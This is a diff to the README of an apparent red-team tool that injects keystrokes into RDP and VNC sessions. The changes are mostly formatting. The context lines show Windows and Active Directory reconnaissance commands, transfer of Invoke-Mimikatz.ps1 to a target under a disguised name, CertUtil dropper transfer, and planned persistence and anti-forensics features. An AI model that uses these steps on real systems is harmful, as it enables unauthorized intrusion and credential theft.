@@ -12,7 +12,6 @@ All credits goes to [nopernik](https://github.com/nopernik) for making it possib
 
 - Executing commands
 - File Transfer
-- Execute C# Implant (Coming soon)
 - Privilege Escalation (Coming soon)
 - Persistence (Coming soon)
 - Anti-Forensics (Coming soon)
@@ -21,7 +20,7 @@ All credits goes to [nopernik](https://github.com/nopernik) for making it possib
 
 ### Dependencies
 
-- For Debian-based distros.
+For Debian-based distros.
 
 ```
 $ sudo apt install -y xfreerdp-x11 xtightvncviewer xdotool
@@ -29,7 +28,7 @@ $ sudo apt install -y xfreerdp-x11 xtightvncviewer xdotool
 
 ### Setup
 
-Install the script in the system.
+Install the program in the system.
 
 ```
 $ sudo wget -O /usr/local/bin/remotekeystrokes https://raw.githubusercontent.com/U53RW4R3/RemoteKeyStrokes/main/remotekeystrokes.sh && \
@@ -89,7 +88,9 @@ $ xfreerdp /kbd:US /clipboard /compression /dynamic-resolution /sec:rdp [/d:"<do
 
 - To remotely authenticate a VNC machine.
 
-`$ vncviewer -passwd password.txt <IP>::<PORT>`
+```
+$ vncviewer -passwd password.txt <IP>::<PORT>
+```
 
 ### 0x01 - Internal Reconnaissance
 
@@ -106,22 +107,22 @@ ipconfig /all
 systeminfo
 
 $ rks -c "cmd.exe" -m dialogbox
-[*] Checking one of the lines reaches 260 character limit
-[*] Executing commands...
-[+] Task completed!
+[INFO] Checking one of the lines reaches 260 character limit
+[PROG] Executing commands...
+[DONE] Task completed!
 
 $ rks -c recon_local_enum_cmds.txt
-[*] Executing commands...
-[+] Task completed!
+[PROG] Executing commands...
+[DONE] Task completed!
 ```
 
 - To execute a single command
 
 ```
 $ rks -c "cmd.exe /k \"whoami /all & net user & net localgroup Administrators & ipconfig /all & systeminfo\"" -m dialogbox
-[*] Checking one of the lines reaches 260 character limit
-[*] Executing commands...
-[+] Task completed!
+[INFO] Checking one of the lines reaches 260 character limit
+[PROG] Executing commands...
+[DONE] Task completed!
 ```
 - Active directory enumeration
 
@@ -133,22 +134,22 @@ net group "Enterprise Admins" /domain
 net group "Domain Computers" /domain
 
 $ rks -c "cmd.exe" -m dialogbox
-[*] Checking one of the lines reaches 260 character limit
-[*] Executing commands...
-[+] Task completed!
+[INFO] Checking one of the lines reaches 260 character limit
+[PROG] Executing commands...
+[DONE] Task completed!
 
 $ rks -c recon_ad_enum_cmds.txt
-[*] Executing commands...
-[+] Task completed!
+[PROG] Executing commands...
+[DONE] Task completed!
 ```
 
 To execute a single command.
 
 ```
 $ rks -c "cmd.exe /k \"net user /domain & net group \"Domain Admins\" /domain & net group \"Enterprise Admins\" /domain & net group \"Domain Computers\" /domain\""
-[*] Checking one of the lines reaches 260 character limit
-[*] Executing commands...
-[+] Task completed!
+[INFO] Checking one of the lines reaches 260 character limit
+[PROG] Executing commands...
+[DONE] Task completed!
 ```
 
 #### Powershell
@@ -273,8 +274,8 @@ Transfer a file remotely when pivoting in a isolated network. If you want to spe
 $ rks -c "powershell.exe" -m dialogbox
 
 $ rks -i Invoke-Mimikatz.ps1 -o "C:\Windows\Temp\update.ps1" -m pwshb64
-[*] Transferring file...
-[+] File transferred!
+[PROG] Transferring file...
+[DONE] File transferred!
 ```
 
 To transfer droppers you can use `CertUtil.exe` base64 especially if it's large.
@@ -358,8 +359,6 @@ $ sudo rm -f /usr/local/bin/remotekeystrokes /usr/local/bin/rks
 - [ ] Implement a persistence function for both windows and linux.
 
 - [ ] Implement antiforensics function for both windows and linux.
-
-- [ ] Implement to read shellcode input and run C# implant and powershell runspace
 
 - [ ] Implement privesc function for both windows and linux
 
